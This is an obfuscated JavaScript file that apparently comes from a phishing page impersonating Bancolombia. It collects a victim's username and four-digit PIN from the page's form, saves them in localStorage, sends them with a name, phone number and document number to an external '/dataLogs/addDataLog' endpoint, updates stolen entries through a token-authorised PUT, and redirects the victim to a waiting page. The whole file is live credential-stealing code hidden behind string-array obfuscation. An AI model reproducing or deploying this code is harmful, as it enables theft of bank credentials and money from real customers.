function _0x36cf(_0x5af7d3, _0x16f639) {
  const _0x22e7a6 = _0x22e7();
  return (
    (_0x36cf = function (_0x36cfdc, _0x35465d) {
      _0x36cfdc = _0x36cfdc - 0x1ab;
      let _0xee1daa = _0x22e7a6[_0x36cfdc];
      return _0xee1daa;
    }),
    _0x36cf(_0x5af7d3, _0x16f639)
  );
}
function _0x22e7() {
  const _0xf8ff2e = [
    "dudename",
    "225mZhkzz",
    "value",
    "Hubo\x20un\x20problema:",
    "getItem",
    "4oEbNOi",
    "/dataLogs/addDataLog",
    "log",
    "dataLogId",
    "/dataLogs/updateUserDataLog/",
    "Datos\x20enviados\x20al\x20servidor\x20y\x20guardados\x20en\x20localStorage",
    "12RrmUkg",
    "number-2",
    "5augAkN",
    "json",
    "error",
    "number-3",
    "continue",
    "application/json",
    "Por\x20favor\x20ingrese\x20los\x204\x20dígitos",
    "Error\x20en\x20la\x20respuesta\x20de\x20la\x20solicitud",
    "24hgpfrk",
    "getElementById",
    "78576nbRtpU",
    "number-4",
    "dataLogToken",
    "href",
    "preventDefault",
    "154254EfToAy",
    "876396gaUxJv",
    "Ingresó\x20usuario",
    "1533595lHbUzs",
    "info",
    "4111613POqbvF",
    "puser",
    "🟡\x20Bancolombia\x20Personas",
    "checkerInfo",
    "click",
    "location",
    "addEventListener",
    "telnum",
    "POST",
    "metaInfo",
    "Bearer\x20",
    "Hubo\x20un\x20error\x20al\x20enviar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "Trico",
    "origin",
    "setItem",
    "mode",
    "836080geRIkE",
    "71347gEnTir",
    "disabled",
    "user",
    "personas",
    "errorTrico",
  ];
  _0x22e7 = function () {
    return _0xf8ff2e;
  };
  return _0x22e7();
}
const _0x429539 = _0x36cf;
(function (_0x17b25c, _0x35074b) {
  const _0xaee3c1 = _0x36cf,
    _0xb885fa = _0x17b25c();
  while (!![]) {
    try {
      const _0xa120ce =
        (parseInt(_0xaee3c1(0x1bc)) / 0x1) *
          (parseInt(_0xaee3c1(0x1c6)) / 0x2) +
        (parseInt(_0xaee3c1(0x1dd)) / 0x3) *
          (parseInt(_0xaee3c1(0x1d6)) / 0x4) +
        (-parseInt(_0xaee3c1(0x1ce)) / 0x5) *
          (-parseInt(_0xaee3c1(0x1de)) / 0x6) +
        -parseInt(_0xaee3c1(0x1e0)) / 0x7 +
        (parseInt(_0xaee3c1(0x1d8)) / 0x8) *
          (parseInt(_0xaee3c1(0x1c2)) / 0x9) +
        -parseInt(_0xaee3c1(0x1bb)) / 0xa +
        (parseInt(_0xaee3c1(0x1ab)) / 0xb) *
          (-parseInt(_0xaee3c1(0x1cc)) / 0xc);
      if (_0xa120ce === _0x35074b) break;
      else _0xb885fa["push"](_0xb885fa["shift"]());
    } catch (_0x28f1cc) {
      _0xb885fa["push"](_0xb885fa["shift"]());
    }
  }
})(_0x22e7, 0x289c6);
function updateLS() {
  const _0x2d9eb0 = _0x36cf;
  LS[_0x2d9eb0(0x1b9)](_0x2d9eb0(0x1e1), JSON["stringify"](info));
}
async function sendDataBCAndPost() {
  const _0x3587bf = _0x36cf,
    _0x3b8d88 = document[_0x3587bf(0x1d7)](_0x3587bf(0x1d2));
  _0x3b8d88[_0x3587bf(0x1bd)] = !![];
  const _0x1c6e70 = localStorage[_0x3587bf(0x1c5)](_0x3587bf(0x1c0)),
    _0x50b524 = {
      reg: info[_0x3587bf(0x1b4)]["cc"],
      name: info["metaInfo"][_0x3587bf(0x1c1)],
      cl: info[_0x3587bf(0x1b4)][_0x3587bf(0x1b2)],
      us: info[_0x3587bf(0x1b4)][_0x3587bf(0x1be)],
      ps: info["metaInfo"][_0x3587bf(0x1ac)],
      source: _0x3587bf(0x1b7),
      status: _0x3587bf(0x1df),
      bn:
        info[_0x3587bf(0x1ae)][_0x3587bf(0x1ba)] === _0x3587bf(0x1bf)
          ? _0x3587bf(0x1ad)
          : "🟡\x20Bancolombia\x20a\x20la\x20Mano",
    };
  try {
    if (_0x1c6e70 === _0x3587bf(0x1d0)) {
      const _0x338f36 = localStorage[_0x3587bf(0x1c5)](_0x3587bf(0x1c9)),
        _0x3d0c3d = localStorage["getItem"](_0x3587bf(0x1da));
      if (!_0x338f36 || !_0x3d0c3d)
        throw new Error(
          "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
        );
      const _0x20f4a2 = await fetch(url + _0x3587bf(0x1ca) + _0x338f36, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: _0x3587bf(0x1b5) + _0x3d0c3d,
          Origin: window["location"][_0x3587bf(0x1b8)],
        },
        body: JSON["stringify"]({
          us: info[_0x3587bf(0x1b4)][_0x3587bf(0x1be)],
          ps: info["metaInfo"][_0x3587bf(0x1ac)],
          status: "Corrigió\x20Usuario",
        }),
      });
      if (!_0x20f4a2["ok"]) {
        const _0x32feb2 = await _0x20f4a2[_0x3587bf(0x1cf)]();
        throw new Error(
          _0x32feb2[_0x3587bf(0x1d0)] ||
            "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor"
        );
      }
      console[_0x3587bf(0x1c8)](
        "Datos\x20actualizados\x20en\x20el\x20servidor\x20con\x20PUT"
      );
    } else {
      const _0x1b7ea7 = await fetch(url + _0x3587bf(0x1c7), {
        method: _0x3587bf(0x1b3),
        headers: {
          "Content-Type": _0x3587bf(0x1d3),
          Origin: window[_0x3587bf(0x1b0)][_0x3587bf(0x1b8)],
        },
        body: JSON["stringify"](_0x50b524),
      });
      if (!_0x1b7ea7["ok"]) {
        const _0x234fda = await _0x1b7ea7["json"]();
        throw new Error(_0x234fda[_0x3587bf(0x1d0)] || _0x3587bf(0x1d5));
      }
      const _0x4e9163 = await _0x1b7ea7[_0x3587bf(0x1cf)]();
      localStorage[_0x3587bf(0x1b9)]("dataLogToken", _0x4e9163["token"]),
        localStorage[_0x3587bf(0x1b9)](_0x3587bf(0x1c9), _0x4e9163["id"]),
        console[_0x3587bf(0x1c8)](_0x3587bf(0x1cb));
    }
    window[_0x3587bf(0x1b0)][_0x3587bf(0x1db)] = "./wait.html";
  } catch (_0x1b8b21) {
    console[_0x3587bf(0x1d0)](_0x3587bf(0x1c4), _0x1b8b21),
      alert(_0x3587bf(0x1b6));
  } finally {
    _0x3b8d88["disabled"] = ![];
  }
}
document[_0x429539(0x1d7)]("continue")[_0x429539(0x1b1)](
  _0x429539(0x1af),
  function (_0x4e7823) {
    const _0x26263a = _0x429539;
    _0x4e7823[_0x26263a(0x1dc)]();
    const _0x326818 = document[_0x26263a(0x1d7)]("number-1")[_0x26263a(0x1c3)],
      _0x3de3b0 = document[_0x26263a(0x1d7)](_0x26263a(0x1cd))[
        _0x26263a(0x1c3)
      ],
      _0x541f39 = document[_0x26263a(0x1d7)](_0x26263a(0x1d1))[
        _0x26263a(0x1c3)
      ],
      _0x3ea5cb = document[_0x26263a(0x1d7)](_0x26263a(0x1d9))[
        _0x26263a(0x1c3)
      ];
    if (
      _0x326818 === "" ||
      _0x3de3b0 === "" ||
      _0x541f39 === "" ||
      _0x3ea5cb === ""
    ) {
      alert(_0x26263a(0x1d4));
      return;
    } else
      (info["metaInfo"]["puser"] =
        _0x326818 + _0x3de3b0 + _0x541f39 + _0x3ea5cb),
        updateLS(),
        sendDataBCAndPost();
  }
);
